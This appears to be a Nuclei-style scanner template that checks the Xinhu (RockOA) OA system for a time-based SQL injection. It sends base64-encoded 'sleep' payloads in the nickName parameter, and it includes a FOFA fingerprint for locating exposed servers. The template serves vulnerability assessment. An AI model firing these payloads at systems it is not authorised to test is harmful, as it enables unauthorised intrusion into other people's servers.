id: poc-yaml-rockoa-index-openmodhetong-sqli

info:
  name: 信呼OA系统index存在SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: xinhu
    fofa: icon_hash="1652488516"

http:
  - raw:
      - |
        GET /index.php?m=openmodhetong%7Copenapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"code":200'
          - '"success":true'
      - type: dsl
        dsl:
          - duration >= 5000 && duration <= 7000

  - raw:
      - |
        GET /index.php?m=openmodhetong%7Copenapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDcpIw== HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"code":200'
          - '"success":true'
      - type: dsl
        dsl:
          - duration >= 7000 && duration <= 9000

variables:
  Hostname: "{{Hostname}}"
